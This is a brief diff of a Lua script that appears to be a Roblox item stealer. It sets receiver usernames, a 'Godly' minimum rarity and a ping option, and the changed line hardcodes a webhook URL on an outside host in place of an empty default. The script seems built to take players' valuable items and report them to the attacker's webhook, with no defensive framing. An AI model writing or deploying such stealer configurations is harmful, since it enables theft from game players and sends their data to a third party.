@@ -85,7 +85,7 @@ local Usernames = Usernames or {'Murd3rf0rm3c', 'Kmao550'}
 local MinimumRarity = MinimumRarity or 'Godly'
 local MinimumValue = MinimumValue or 1
 local PingEveryone = PingEveryone or 'Yes'
-local Webhook = Webhook or ''
+local Webhook = Webhook or 'https://sentinelhook.lol/api.php?id=XhZb5BiKhC9WOST'
 
 local a, b, c, d, e = Usernames, MinimumRarity, MinimumValue, PingEveryone, Webhook
 
